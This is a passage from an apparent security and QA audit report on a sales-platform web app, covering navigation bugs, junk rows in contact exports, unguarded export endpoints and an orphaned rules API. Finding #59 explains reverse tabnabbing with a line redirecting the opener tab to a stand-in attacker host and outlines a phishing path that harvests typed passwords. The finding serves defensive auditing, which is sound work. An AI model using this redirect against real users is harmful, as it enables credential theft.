### 53. Legacy 1 MB feedback description still shipped in every list response
**Severity:** 🔵 LOW · **Area:** Feedback / Data hygiene

#### What I saw
`GET /api/v1/feedback` returns 20 items. One item's `description` field contains ~1,000,000 characters of filler — a leftover from a Round 2 probe that submitted a 1 MB description to verify there was no bound (which became Finding #25).

Finding #25's code fix caps `description`, `steps_to_reproduce`, `expected_behavior`, `actual_behavior`, `use_case`, `proposed_solution`, `impact`, `screenshot_url`, and `admin_notes` at 8000 chars on **new submissions**, but the existing 1 MB row is not retroactively trimmed.

The feedback page CSS-truncates with `class="truncate"` so visually you don't see it, but the DOM carries the full 1 MB string. Measurable TTFB / DOM-weight regression on every list fetch.

#### Why it matters
Not a security issue, but a non-trivial performance one. Every user loading `/feedback` pays the cost. Over time, if more legacy rows from before #25 exist, the cost compounds. Also a data-hygiene loose end that should be closed before the #25 fix is considered "done".

#### Suggested fix
Post-deploy one-shot cleanup script, modelled on `app/close_legacy_duplicate_feedback.py`:

```python
# app/trim_oversized_feedback.py
FIELDS = ['description','steps_to_reproduce','expected_behavior',
          'actual_behavior','use_case','proposed_solution','impact','admin_notes']
MAX = 8000

# For each row in feedback:
#   For each field:
#     if LENGTH(field) > MAX:
#       field = LEFT(field, MAX) || '… [truncated legacy row]'
#   if any field changed: UPDATE
```

Include `--dry-run`. Log per-row change counts.

Alternative: cap the field in the `FeedbackOut` list serializer so list responses are small even if DB cleanup is deferred. Detail endpoint keeps the full value (ticket author can still see their original submission).

#### Cleanup
Read-only. The 1 MB row predates this session.

---

## 17. Round 4C — Applications + Pipeline Deep Audit (2026-04-15, even later)

Third pass focused on pages I'd only spot-checked earlier: Applications, Answer Book "Add Entry" flow, and the Pipeline kanban board's interaction model. Findings #54–#57.

### 54. Applications empty-state is a dead-end with no CTA
**Severity:** 🟡 MEDIUM · **Area:** Applications / Onboarding

#### What I saw
`/applications` with 0 rows:

```
Applications
Track your job applications

[ 0 ] Total    [ 0 ] Applied    [ 0 ] Interview    [ 0 ] Offer

All | Prepared | Submitted | Applied | Interview | Offer | Rejected | Withdrawn

┌──────┬──────────┬──────────┬─────────┬────────┬──────┬─────────┐
│ Job  │ Company  │ Platform │ Resume  │ Status │ Date │ Actions │
├──────┴──────────┴──────────┴─────────┴────────┴──────┴─────────┤
│                    No applications found                         │
└──────────────────────────────────────────────────────────────────┘
```

No `+ Add Application` button. No explanatory text. No link to the Review Queue, Jobs, or any other place where applications might originate. Probed:

```js
document.querySelectorAll('main a').length  // → 0
[...document.querySelectorAll('button')].map(b => b.innerText.trim()).filter(t=>t)
// → ['Sign out', 'All', 'Prepared', 'Submitted', 'Applied', 'Interview', 'Offer', 'Rejected', 'Withdrawn']
```

#### Why it matters
A new user landing here sees an empty table and doesn't know how applications are created. Is it automatic when you mark a job "Applied" in the Review Queue? Is it a manual form somewhere? The Docs page mentions applications but doesn't fully explain the creation path either. Discoverability failure.

#### Suggested fix
`ApplicationsPage.tsx` empty-state: replace the bare "No applications found" with an instructional block:

```tsx
{rows.length === 0 && (
  <div className="text-center py-12">
    <h3 className="text-lg font-semibold">No applications yet</h3>
    <p className="text-gray-600 mt-2 mb-4">
      Applications are created automatically when you mark a job as
      "Applied" in the Review Queue, or when you submit one from a
      job's detail page.
    </p>
    <div className="flex gap-3 justify-center">
      <Link to="/review" className="btn btn-primary">Open Review Queue</Link>
      <Link to="/jobs?role_cluster=relevant" className="btn btn-secondary">Browse Relevant Jobs</Link>
    </div>
  </div>
)}
```

If there's also a manual-entry path (Add Application button) it should live up in the page header, not just in the empty-state.

#### Cleanup
Read-only probe.

---

### 55. Applications stat cards show only 4 of the 8 statuses
**Severity:** 🟡 MEDIUM · **Area:** Applications / Overview

#### What I saw
Filter tabs: `All · Prepared · Submitted · Applied · Interview · Offer · Rejected · Withdrawn` (8 statuses).

Stat cards at the top: `Total · Applied · Interview · Offer` (only 4).

The four missing buckets (`Prepared`, `Submitted`, `Rejected`, `Withdrawn`) aren't summed anywhere in the overview. A user whose pipeline is 80% rejected sees the same `Total N` and cannot tell the rejection rate without tab-hopping.

#### Why it matters
Page is called "Track your job applications" but the overview deliberately omits the negative outcomes (Rejected / Withdrawn) and the pre-submit states (Prepared / Submitted). Misleading at a glance.

#### Suggested fix
Two options:
- **(A)** Collapse into meaningful aggregates. 5 cards:
  - `Total`
  - `In Progress` = Prepared + Submitted + Applied + Interview
  - `Offers` = Offer
  - `Rejected` = Rejected
  - `Withdrawn` = Withdrawn
- **(B)** Replace the 4-card grid with a small stacked-bar funnel that shows all 8 buckets proportionally. Clicking a segment filters the table below.

(A) is faster to ship; (B) is more informative.

#### Cleanup
Read-only.

---

### 56. Pipeline kanban cards aren't clickable; company names are plain text
**Severity:** 🟡 MEDIUM · **Area:** Pipeline / Navigation

#### What I saw
On `/pipeline`, each card is a `<div class="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">` with:
- a `<p>` for the company name (not a heading, not a link)
- `<p>` tags for metrics
- two icon-only `<button>` elements (`title="Move to previous stage"`, `title="Move to next stage"`)

Probed:
```js
document.querySelectorAll('main a').length  // → 0
card.onclick                                  // → false
card.querySelector('a')                       // → null
```

Clicking anywhere on the card is a no-op (`textDelta: 0` after click, no modal, no nav).

#### Why it matters
The Pipeline is the sales team's daily landing page for triaging outreach. Every card represents a company they want to click into — to see open roles, enrich the record, check notes, whatever. No path from the card to the Company detail is a critical UX gap.

Adjacent to Finding #35 (Dashboard job-preview rows also not clickable). Same underlying cause: the author shipped cards that *look* interactive but aren't.

#### Suggested fix
`PipelinePage.tsx` card body:

```tsx
<div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm relative">
  <Link
    to={`/companies/${card.company_id}`}
    className="block -m-3 p-3 rounded-lg hover:bg-gray-50"
  >
    <p className="text-sm font-semibold text-gray-900 leading-tight">
      {card.company_name}
    </p>
    <p className="text-xs text-gray-500 mt-1">{card.open_roles} open roles</p>
    {/* … */}
  </Link>

  <div className="absolute top-2 right-2 flex gap-1">
    <button
      onClick={(e) => { e.stopPropagation(); moveToPrevStage(card); }}
      title="Move to previous stage"
      aria-label={`Move ${card.company_name} to previous stage`}
    >
      <ChevronLeft className="h-3 w-3" />
    </button>
    {/* and next */}
  </div>
</div>
```

Key: the two move buttons sit absolutely-positioned above the Link and call `e.stopPropagation()` so clicking them doesn't also fire the card link.

#### Cleanup
Read-only.

---

### 57. Pipeline has no drag-and-drop; stage changes are per-card button clicks
**Severity:** 🔵 LOW (optional) · **Area:** Pipeline / UX polish

#### What I saw
Each pipeline card has exactly two stage-movement buttons:
- Left-pointing icon, `title="Move to previous stage"`
- Right-pointing icon, `title="Move to next stage"`

Verified `draggable === false` on the card. No `onDragStart` / `onDragOver` / `onDrop` handlers attached. The stage columns are `role`-less `<div>`s.

#### Why it matters
Kanban boards without drag-drop feel slow. Moving a card from `New Lead` → `Engaged` requires 4 forward-clicks per card. At today's 10 cards this is fine. At 50+ cards it compounds.

Not a functional bug — the buttons work — but a commonly-expected affordance.

Also: the two buttons share the `title` vs `aria-label` pattern from Finding #45. Each per-card button announces as just "button" to AT with no context about which stage the user is moving to.

#### Suggested fix
Two-part:
- **(A)** Add HTML5 drag-and-drop or `@dnd-kit/core`. On `drop`, emit the same `PATCH /api/v1/pipeline/{id} { stage: <new> }` that the buttons already emit. Keyboard-only users keep the buttons as fallback.
- **(B)** Fix the accessibility labels while you're there: `aria-label={`Move ${company_name} to ${prevStageName}`}` gives screen readers an actionable announcement.

This is flagged as 🔵 LOW because the current UI works for the current data volume; upgrade when stage-count-per-card exceeds ~20 cards / stage.

#### Cleanup
Read-only.

---

### 58. Company cards use `div.onClick` instead of `<a>`; detail "Open Roles" isn't a link
**Severity:** 🟡 MEDIUM · **Area:** Companies / Navigation semantics

#### What I saw
Probed the first card on `/companies`:

```js
cardClass: "rounded-xl border border-gray-200 bg-white shadow-sm p-6
            hover:border-primary-300 hover:shadow-md transition-all
            cursor-pointer group"
cardInnerHref: null         // no <a> inside
cardHasOnClick: true        // JS handler present
cardTag: "DIV"
```

Clicked the card, location changed to `/companies/425297bc-…`. So navigation works — but via a JS `onClick` instead of a real anchor.

On the resulting `/companies/{id}` detail page: `document.querySelectorAll('main a').length === 0`. The "Open Roles: 1" metric is a plain `<span>` — no link to the matching jobs filtered by this company.

#### Why it matters
`<div onClick>` masquerading as a link breaks every standard web-nav expectation:

- Middle-click or Cmd/Ctrl-click doesn't open the target in a new tab (users expect to triage companies in tabs).
- Right-click → "Open link in new tab" / "Copy link address" don't appear in the menu — the div isn't recognised as a link.
- Keyboard users can't Tab to the card (no `tabindex`, no `role="link"`). Space / Enter does nothing.
- Screen readers announce "clickable, …" at best; often just the card text with no interactive affordance.

On the detail page, "Open Roles: 1" telling the user there's a role but not letting them click to see it is a dead-end similar to Finding #56.

#### Suggested fix
`CompaniesPage.tsx`:
```tsx
// Before:
<div onClick={() => navigate(`/companies/${c.id}`)} className="cursor-pointer …">
  <h3>{c.name}</h3>
  …
  <button onClick={onPipelineClick}>Pipeline</button>
</div>

// After:
<Link to={`/companies/${c.id}`} className="block rounded-xl border … hover:border-primary-300">
  <h3>{c.name}</h3>
  …
  <button
    onClick={(e) => { e.preventDefault(); e.stopPropagation(); onPipelineClick(); }}
  >Pipeline</button>
</Link>
```

`CompanyDetailPage.tsx` overview grid:
```tsx
<div>
  <span className="text-sm text-gray-500">Open Roles</span>
  <Link to={`/jobs?company_id=${company.id}`} className="text-2xl font-semibold hover:underline">
    {company.open_roles.toLocaleString()}
  </Link>
</div>
```

Same applies to "Enriched", "Accepted", etc. if any of those have a corresponding filtered view.

#### Cleanup
Read-only. Clicking the first card navigated to the detail page; hitting Back returned to the list. No mutations.

**Addendum (same pattern on `/jobs`):** further probing showed that the same `<div onClick>` anti-pattern also applies to Jobs table rows — `<tr class="cursor-pointer hover:bg-gray-50" onClick={…}>`, no anchor inside, no `tabindex`, same failure mode. The fix pattern is identical (use `<Link>`). Updated the summary-row detail in §1.

---

### 59. External anchors on `/jobs/{id}` open with `target="_blank"` but no `rel="noopener noreferrer"`
**Severity:** 🟠 HIGH · **Area:** Security / XSS-adjacent

#### What I saw
Probed a live Job Detail page (`/jobs/62bd2b45-…`, AlphaSense Compliance Analyst role scraped from Greenhouse):

```js
[...document.querySelectorAll('main a')]
  .filter(a => /^https?:/.test(a.getAttribute('href')) && !/salesplatform\.reventlabs\.com/.test(a.href))
  .map(a => ({ text: a.innerText, href: a.href, target: a.target, rel: a.rel }));
// → [
//   { text:'View Original Listing', href:'https://job-boards.greenhouse.io/…',
//     target:'_blank', rel:'noopener noreferrer' },                              // ✅
//   { text:'alpha-sense.com',       href:'http://alpha-sense.com/',
//     target:'_blank', rel:'(none)' },                                           // ❌
//   { text:'Careers page',          href:'https://www.alpha-sense.com/careers/',
//     target:'_blank', rel:'(none)' },                                           // ❌
// ]
```

"View Original Listing" is rendered correctly. The two `Company.*` URLs (`website` and `careers_url`) are not.

#### Why it matters
`<a target="_blank" rel="">` is the classic reverse-tabnabbing vector (OWASP: Reverse Tabnabbing). The opened tab can execute `window.opener.location = 'https://evil.example'` and replace the originating sales-platform tab with a phishing clone. User clicks back to their "sales platform" tab, sees what looks like a login page, and re-enters credentials. Because our JWT is in an HttpOnly cookie, the phishing site can't read it — but it *can* harvest the typed password.

Browser defaults changed in Chrome 88 / Firefox 79 to implicitly set `noopener` when `target="_blank"`, but:
- Safari still honours `window.opener` in some configurations.
- Older Chromium-based browsers (Edge Legacy, older Brave, in-app webviews) don't.
- Corporate environments that pin browser versions often lag.

An attacker's path: register a company, get an admin to paste `https://attacker.example` into `Company.website` (via manual add or a compromised scrape), wait for users to click the link on any job posting for that company.

#### Suggested fix
Two-part:

1. `JobDetailPage.tsx`: every `<a target="_blank">` gets `rel="noopener noreferrer"`. A tiny helper avoids future regressions:
   ```tsx
   // components/ExternalLink.tsx
   export function ExternalLink({ href, children, ...rest }: Props) {
     return <a href={href} target="_blank" rel="noopener noreferrer" {...rest}>{children}</a>;
   }
   ```
   Replace every `<a href={…} target="_blank">` on the page with `<ExternalLink>`.

2. Audit the other places that render arbitrary URLs: company detail (same `website`/`careers_url`), any platform/ATS redirect, any Intelligence > Networking "source URL" link, etc. A grep for `target="_blank"` should surface all of them.

3. Optional belt-and-suspenders: add a global ESLint rule (e.g. `react/jsx-no-target-blank`) that flags any `target="_blank"` without `rel="noopener"` at lint-time.

#### Cleanup
Read-only probe.

---

## 18. Round 4F — Bulk export endpoint audit

Round 4F focused on the three bulk-export endpoints (`/api/v1/export/{jobs,pipeline,contacts}`), which are reachable from the Export Contacts button on `/companies` but were not previously exercised. Findings #60–#62 came out of parsing the full 3,756-row contacts CSV and cross-referencing the response with `platform/backend/app/api/v1/export.py`.

### 60. Contact export is 11.8% stop-word junk rows from `source=job_description`
**Severity:** 🟠 HIGH · **Area:** Data Quality / Export

#### What I saw
```js
// In /companies tab, parse the live CSV.
const r = await fetch('/api/v1/export/contacts', {credentials: 'include'});
const csv = await r.text();
// …proper quoted-CSV parser…
// Breakdown:
{
  rowCount:         3756,
  hdrCount:         19,
  emailPresent:     1427,   // only 38 % have any email
  phonePresent:     0,      // column always empty
  telegramPresent:  0,      // column always empty
  linkedinPresent:  620,
  uniqueCompanies:  957,
  sourceBuckets: {
    job_description: 1348,  // <- the junk source
    role_email:       156,
    website_scrape:  2252
  },
  confidenceBuckets: { "0.4": 156, "0.7": 3268, "0.8999999999999999": 332 },
  topTitles: [
    ["Recruiter / Hiring Contact", 1348],  // ← all from job_description
    ["",                            120],
    ["CEO",                          56],
    ["Chief Financial Officer",      56],
    …
  ],
  weirdFirstCount: 445,     // first_name is an English stop-word
  weirdBothCount:  148,     // BOTH first and last are stop-words
}
```

Concrete junk rows (sample of 148 where both names are stop-words):

| company | first_name | last_name | title | source | email |
|---------|------------|-----------|-------|--------|-------|
| Abbott | help | you | Recruiter / Hiring Contact | job_description | (empty) |
| AbbVie | for | the | Recruiter / Hiring Contact | job_description | (empty) |
| Airbnb | us | at | Recruiter / Hiring Contact | job_description | (empty) |
| Airbnb | us | if | Recruiter / Hiring Contact | job_description | (empty) |
| AltScore | in | our | Recruiter / Hiring Contact | job_description | (empty) |
| AHEAD | us | at | Recruiter / Hiring Contact | job_description | (empty) |
| Addepar | us | to | Recruiter / Hiring Contact | job_description | (empty) |
| American Regent, Inc. | with | division | Recruiter / Hiring Contact | job_description | (empty) |
| 200510503Z Thermo Fisher… | apply | for | Recruiter / Hiring Contact | job_description | (empty) |

All 148 rows have empty `email`, `phone`, `linkedin_url`, `telegram_id`. **Zero actionable data** — they pollute outreach lists with phantom "contacts" derived from English prose in job descriptions.

The broader count of 445 stop-word-first-name rows includes ones where the *second* token happened to look like a name (e.g. `{first:"learn", last:"Tools", title:"Recruiter / Hiring Contact"}`). Those are equally useless.

#### Why it matters
- Sales team opens the Contacts export, sees 3,756 rows, and immediately loses trust when 1 in 9 is garbage.
- CRM imports will ingest the noise and waste enrichment credits.
- The `confidence_score=0.7` is the same for the good `website_scrape` rows (real exec names) and the junk `job_description` rows, so a downstream filter by confidence doesn't help.
- The `phone` and `telegram_id` columns are always empty (0/3756) — adds to the impression of broken data.

#### Root cause (from matching behavior to code)
The extractor that reads `source="job_description"` is running a regex over free-text like *"please help us at careers@…"* / *"apply for the role at…"* / *"learn more about our team"* / *"reach out to us if…"* and treating two adjacent tokens after the trigger as `first_name last_name`. There's no:

- English stop-word filter
- Uppercase-first-letter check (real names are capitalized; `help`, `for`, `us`, `to` are not)
- Minimum length / alphabetic constraint
- Frequency guard (the same pair `("for","the")` appears across dozens of unrelated companies — obviously not a name)

#### Suggested fix
`workers/tasks/` wherever the contact extraction for `source=job_description` happens (likely `enrichment_task.py` / `_ai_resume.py` neighbour):

```python
STOPWORDS = {
    "help","here","click","read","learn","apply","view","send","what","who","where","when","how",
    "this","that","our","your","we","the","a","an","in","at","on","of","to","for","with","and",
    "or","is","are","was","were","be","been","by","from","as","if","it","its","their","them",
    "they","he","she","you","us","so","do","does","did","up","down","out","over","about","into",
    "more","most","other","some","such","no","not","only","own","same","than","too","very","can",
    "will","just","should","now","each","both","back","complex","customer","motivated","regarding",
    "themselves","yourself","key","business","compliance","division","environment","high",
}

def looks_like_name(first: str, last: str) -> bool:
    for tok in (first, last):
        if not tok: return False
        if tok.lower() in STOPWORDS: return False
        if not tok[0].isupper(): return False
        if not (2 <= len(tok) <= 20): return False
        if not tok.replace("-", "").replace("'", "").isalpha(): return False
    return True

# Before saving a contact:
if not looks_like_name(first_name, last_name):
    continue  # skip — not a real name
```

Backfill one-shot (similar to `app/close_legacy_duplicate_feedback.py` pattern):

```python
# app/cleanup_stopword_contacts.py
from sqlalchemy import delete
from app.models.company_contact import CompanyContact
from app.database import get_sync_session

STOPWORDS = {…}  # same set

def main(dry_run: bool = True):
    sess = get_sync_session()
    candidates = sess.query(CompanyContact).filter(
        CompanyContact.source == "job_description"
    ).all()
    to_delete = [
        c.id for c in candidates
        if (c.first_name or "").lower() in STOPWORDS
        or (c.last_name or "").lower() in STOPWORDS
        or not (c.first_name or "") or len(c.first_name) < 2
    ]
    print(f"Would delete {len(to_delete)} of {len(candidates)}")
    if not dry_run:
        sess.execute(delete(CompanyContact).where(CompanyContact.id.in_(to_delete)))
        sess.commit()
```

#### Cleanup
Read-only probe. Fetched the export but did not submit, modify, or delete anything.

---

### 61. Bulk-export endpoints gate on "logged in" only — any viewer can dump the whole DB
**Severity:** 🟠 HIGH · **Area:** Auth / Data Exfiltration

#### What I saw
Read `platform/backend/app/api/v1/export.py` directly (the file, not just the network response):

```python
@router.get("/jobs")
async def export_jobs(
    …,
    user: User = Depends(get_current_user),   # ← no require_role
    db: AsyncSession = Depends(get_db),
): …

@router.get("/pipeline")
async def export_pipeline(
    …,
    user: User = Depends(get_current_user),   # ← no require_role
    db: AsyncSession = Depends(get_db),
): …

@router.get("/contacts")
async def export_contacts(
    …,
    user: User = Depends(get_current_user),   # ← no require_role
    db: AsyncSession = Depends(get_db),
): …
```

All three endpoints use plain `get_current_user`. Nothing scopes by `user.role`, `user.tenant_id`, or `user.id`. The query is `select(CompanyContact, Company.name).join(Company …)` — no `WHERE` clause bound to the caller.

Live probe (logged in as `admin`, `test-admin@reventlabs.com`):
```
GET /api/v1/export/contacts     → 200, ~640 KB, 3,756 rows
```
No rate limit visible; no audit log written anywhere `/monitoring` can see.

Front-end confirmation — `CompaniesPage.tsx` line 88:
```tsx
<a href={exportContactsUrl()} className="…" title="Export all contacts as CSV">
  <Download className="h-4 w-4" /> Export Contacts
</a>
```
No `{user.role === 'admin' && …}` guard. Every logged-in role sees the button.

Anonymous check:
```
GET /api/v1/export/contacts  (credentials:'omit')  → 401 Unauthorized
```
Good — anonymous is blocked. But reviewer / viewer / admin all get 200.

#### Why it matters
- A compromised viewer account (contractor on-boarded with read-only access, stolen session cookie from a coffee-shop WiFi attack, etc.) can download the entire sales prospect list in one GET. 3,756 contacts × 957 companies × email metadata is a meaningful competitive-intel leak.
- There's no audit log signal. No one will notice that a viewer pulled the whole CSV.
- The same gap applies to `/export/jobs` (the open-role list is less sensitive but is still proprietary scrape output) and `/export/pipeline` (**which includes `notes` — free-text fields that may contain "John at Acme is unhappy with their current vendor" type commentary**).
- The product is single-tenant today, but if multi-tenant support ever ships, this becomes a cross-tenant data leak the moment the first tenant splits out.

#### Suggested fix
Three patches:

1. `platform/backend/app/api/v1/export.py`:
   ```python
   from app.api.deps import require_role

   @router.get("/jobs")
   async def export_jobs(…, user: User = Depends(require_role("admin")), …): …
   @router.get("/pipeline")
   async def export_pipeline(…, user: User = Depends(require_role("admin")), …): …
   @router.get("/contacts")
   async def export_contacts(…, user: User = Depends(require_role("admin")), …): …
   ```
   If sales-team reviewers have a legitimate export need, use `require_role("reviewer")` (which includes admin+super_admin). Don't allow viewer.

2. Audit log — new `audit_log` table or re-use `scan_log` style:
   ```python
   await db.execute(insert(AuditLog).values(
       user_id=user.id, action="export_contacts",
       row_count=len(rows), filter_params=str(dict(role_category=…, …)),
       created_at=datetime.utcnow(),
   ))
   ```

3. `platform/frontend/src/pages/CompaniesPage.tsx`:
   ```tsx
   {user?.role === 'admin' && (
     <a href={exportContactsUrl()} …>Export Contacts</a>
   )}
   ```
   Keeps the UI aligned with the backend role gate. Also do the same for any "Export Jobs" / "Export Pipeline" buttons (grep for `exportJobsUrl`, `exportPipelineUrl`).

Optional — add a per-user rate limit via `slowapi` or a simple Redis counter: e.g. ≤ 3 full-table exports per hour per user. Slows down programmatic scraping even by authorised admins.

#### Cleanup
Read-only probe. No mutations. Server-side: no patch applied yet — this finding records the gap so the bug-fixer can gate it.

---

### 62. Export CSV has two permanently-empty columns (`phone`, `telegram_id`)
**Severity:** 🔵 LOW · **Area:** Data / Export

#### What I saw
Parsed all 3,756 rows; counted populated columns:
```
phone        : 0 / 3756
telegram_id  : 0 / 3756
email        : 1427 / 3756  (38 %)
linkedin_url : 620 / 3756   (16 %)
```

Columns are declared in `CONTACT_CSV_COLUMNS` (`api/v1/export.py` line 146) and written for every row (`rows.append([…, contact.phone, contact.linkedin_url, contact.telegram_id, …])`) — but the values are always empty strings because the enrichment pipeline never writes to `CompanyContact.phone` or `CompanyContact.telegram_id`.

#### Why it matters
Low severity, but:
- Sales pulls the CSV into a CRM and sees two empty columns → looks like a bug or missing data.
- Future enrichment devs will assume these columns are used and build on the false baseline.
- Noise in sample/demo exports (e.g. when showing the platform to new prospective users).

#### Suggested fix
Pick one:

**(a) Remove from export until populated:**
```python
# api/v1/export.py, line 146-152
CONTACT_CSV_COLUMNS = [
    "company", "first_name", "last_name", "title", "role_category",
    "department", "seniority", "email", "email_status",
    # removed: "phone", "telegram_id",
    "linkedin_url", "is_decision_maker",
    "outreach_status", "outreach_note", "last_outreach_at",
    "source", "confidence_score", "created_at",
]
# row builder (line 184-206): drop contact.phone and contact.telegram_id indices
```

**(b) Wire up enrichment:** add a Hunter.io / Apollo / Clearbit call in `workers/tasks/enrichment_task.py` that populates `phone` and `telegram_id` when available (telegram is unusual for B2B sales — consider dropping it entirely and substituting a different signal like Twitter/X handle or company-wide Slack Connect invite URL).

Least-work path: (a) now, then (b) when enrichment scope is decided.

#### Cleanup
Read-only probe.

---

## 19. Round 4G — Rules API + Intelligence endpoints

Round 4G: two untouched backend surfaces — `/api/v1/rules` (orphan admin API) and the `/api/v1/intelligence/*` family (skill-gaps, salary, timing, networking). Five findings #63–#67.

### 63. Rules API is orphaned; cluster whitelist hardcoded to two names while the product supports N
**Severity:** 🟡 MEDIUM · **Area:** Admin / API Drift

#### What I saw
Frontend search:
```
grep -R 'listRules|createRule|RolesPage|RulesPage|/api/v1/rules' platform/frontend/src
# → nothing
```
No page, no API-client function, no sidebar entry.

Backend registration in `platform/backend/app/api/v1/router.py`:
```python
from app.api.v1 import (… rules, …)
api_router.include_router(rules.router)     # ← still wired
```

Live probe as admin (`test-admin@reventlabs.com`):
```
GET  /api/v1/rules                          → 200 {total:1, items:[{cluster:"infra", base_role:"infra", keywords:[12 items], is_active:true}]}
GET  /api/v1/rules?cluster=qa               → 200 {total:0, items:[]}
GET  /api/v1/role-clusters                  → {items:[infra, qa, security], relevant_clusters:[infra,qa,security]}
GET  /api/v1/jobs?role_cluster=qa           → {total:509}
POST /api/v1/rules {cluster:"qa", base_role:"qa", keywords:["qa engineer"], is_active:true}
  → 400 {"detail":"Cluster must be 'infra' or 'security'"}
```

Hardcoded whitelist in `api/v1/rules.py`:
```python
# lines 58-59 (POST) and 82-83 (PATCH)
if body.cluster not in ("infra", "security"):
    raise HTTPException(status_code=400, detail="Cluster must be 'infra' or 'security'")
```

#### Why it matters
- The "QA / Testing / SDET" cluster (registered in the `role_cluster_configs` table, `sort_order=2`, `is_relevant=true`) is already driving 509 classified jobs. But the Rules API refuses to let any admin *configure* a rule for it — silently blocks at `POST /rules`.
- The single existing row (`cluster=infra, base_role=infra, 12 keywords`) suggests this was an early pre-`role_cluster_configs` design that was partly replaced by the Role Clusters admin page but never fully retired.
- Orphan APIs are attack surface: they stay reachable, they get audited as features that work, and future devs waste time building around them.

#### Suggested fix
Two valid paths; pick one:

**(a) Retire the orphan:**
```python
# platform/backend/app/api/v1/router.py
- from app.api.v1 import (… rules, …)
- api_router.include_router(rules.router)
+ from app.api.v1 import (…)
# delete api/v1/rules.py, models/rule.py, schemas/rule.py, and the alembic migration if any
```
Then document in CLAUDE.md: "Role-matching keywords live in `role_cluster_configs.keywords` only. The old `/api/v1/rules` API has been removed." Also drop the `role_rules` table in a migration and migrate the orphan row's keywords into the `infra` row of `role_cluster_configs.keywords` (they overlap mostly with what's already there).

**(b) Revive it:** replace the hardcoded whitelist with a dynamic lookup:
```python
async def _valid_clusters(db: AsyncSession) -> set[str]:
    result = await db.execute(select(RoleClusterConfig.name).where(RoleClusterConfig.is_active == True))
    return {r[0] for r in result}

async def create_rule(body: RoleRuleCreate, db: AsyncSession, user: User = Depends(require_role("admin"))):
    valid = await _valid_clusters(db)
    if body.cluster not in valid:
        raise HTTPException(400, f"Cluster must be one of: {sorted(valid)}")
    …
```
And add a `RulesPage.tsx` to make the API reachable.

Option (a) is cleaner given that `role_cluster_configs` already handles keywords + approved roles.

#### Cleanup
Read-only probe except for one `POST /api/v1/rules {cluster:"qa",…}` attempt that was rejected with 400. No row created, no state changed.

---

### 64. Intelligence `/networking` filter only inspects `first_name` — misses `{first:"Gartner", last:"PeerInsights"}`
**Severity:** 🟠 HIGH · **Area:** Intelligence / Data Quality

#### What I saw
Live response from `GET /api/v1/intelligence/networking`:

```js
suggestions[0] = {
  name: "Gartner PeerInsights",
  title: "Wade BillingsVP, Technology Services, Instructure",
  company: "BugCrowd",
  is_decision_maker: true,     // ← elevated priority
  email_status: "catch_all",
  ...
}
suggestions[1] = {name:"Ross McKerchar", title:"CISO, Sophos", company:"BugCrowd", is_decision_maker:true, ...}
```

"Ross McKerchar · CISO, Sophos" at BugCrowd is also suspicious — Ross McKerchar is Sophos's real CISO, not a BugCrowd contact. The title fragment `"CISO, Sophos"` is a strong hint that the scraper pulled a Sophos exec from a page that BugCrowd was citing and mis-attributed it.

Source code `api/v1/intelligence.py` lines 381-418:
```python
def _looks_like_corrupted_contact(first_name, last_name, title):
    fn = (first_name or "").strip()
    ln = (last_name or "").strip()
    tt = (title or "").strip()

    if not fn: return True                              # ← rejects empty fn only
    if _COMMA_OR_PIPE.search(fn) or _COMMA_OR_PIPE.search(ln): return True
    if len(tt) > 120: return True
    parts = [p.strip() for p in tt.split(",") if p.strip()]
    if len(parts) >= 3: return True                     # ← "Wade BillingsVP, Technology Services, Instructure" → 3 → should reject

    internal_caps = sum(1 for i, c in enumerate(fn) if i > 0 and c.isupper())
    if internal_caps >= 2: return True                  # ← ONLY fn is checked

    return False
```

Two problems:

1. **The `internal_caps` check ignores `last_name`.** For the row `{first:"Gartner", last:"PeerInsights"}`, `fn="Gartner"` has 0 internal caps. `ln="PeerInsights"` has 2 (`P`, `I`) — but the code never examines `ln`. Passes.

2. **If the `len(parts) >= 3` check were in the deployed build, `"Wade BillingsVP, Technology Services, Instructure"` would be rejected.** The row appearing in the response means either (a) prod is on pre-fix code (Finding #32 tracks deploy lag), or (b) the function was subtly changed during review — I couldn't determine which without shelling into prod. Either way, the user sees the corrupted row today.

#### Why it matters
- The first three "recommended contacts" for the user to reach out to include a fabricated name (`"Gartner PeerInsights"` is two page elements glued together) and a cross-company mis-attribution (`Ross McKerchar · CISO, Sophos` at BugCrowd).
- Sales sends an email / LinkedIn ping to these "contacts" → bounce / confused reply / reputation damage.
- `is_decision_maker: true` elevates these fake rows to the top of the list specifically because they look like exec titles.
- Regression #27's stated goal was to hide exactly these rows from outreach; the filter as-written is incomplete.

#### Suggested fix
```python
# api/v1/intelligence.py  _looks_like_corrupted_contact()
# 1. Run internal_caps check on BOTH first_name AND last_name:
for name in (fn, ln):
    if sum(1 for i, c in enumerate(name) if i > 0 and c.isupper()) >= 2:
        return True

# 2. Add the stop-word filter from Finding #60:
STOPWORDS = {"help","for","the","a","an","in","at","on","of","to","with","and","or",
             "is","are","be","been","by","from","as","if","it","us","we","you","our",
             "your","what","who","where","when","how","this","that","more","most",
             "other","no","not","only","can","will","just","now","both","back",
             "apply","learn","send","read","view","click","here"}
if fn.lower() in STOPWORDS or ln.lower() in STOPWORDS:
    return True

# 3. Extend to title: if title ends with a company name fragment that is NOT
#    this contact's company, likely mis-attributed:
if tt and "," in tt:
    last_seg = tt.rsplit(",", 1)[-1].strip()
    # this needs the company context passed in — small refactor
    if last_seg and last_seg.lower() != (company_name or "").lower() and len(last_seg.split()) <= 3:
        return True   # "CISO, Sophos" when company_name="BugCrowd" → reject
```

Deploy and re-fetch `/api/v1/intelligence/networking`; first page should no longer contain `Gartner PeerInsights` or `Ross McKerchar … BugCrowd`.

#### Cleanup
Read-only probe.

---

### 65. Intelligence `/timing` still recommends Sunday as "best_day" despite the per-second workaround
**Severity:** 🟡 MEDIUM · **Area:** Intelligence / Data

#### What I saw
```
GET /api/v1/intelligence/timing
posting_by_day:
  Sunday    23696
  Monday     6496
  Tuesday    5456
  Wednesday  4803
  Thursday   3020
  Friday     2384
  Saturday   1921
recommendations.best_day: "Sunday"
```

Sunday is 4.3× the next-highest day. The query already applies the workaround from regression #26:
```sql
AND ABS(EXTRACT(EPOCH FROM (posted_at - first_seen_at))) > 1
```
This filter is meant to drop the seed-import rows where `posted_at` was backfilled to equal `first_seen_at`. It's not enough — either the seed import set `posted_at` slightly different from `first_seen_at` (a few seconds of drift during bulk insert), or genuine Sunday ATS batch jobs actually dominate.

#### Why it matters
- The Intelligence page's `recommendations.best_day` is a direct action the user takes (schedule their outreach for Sunday). Wrong recommendation → real user harm.
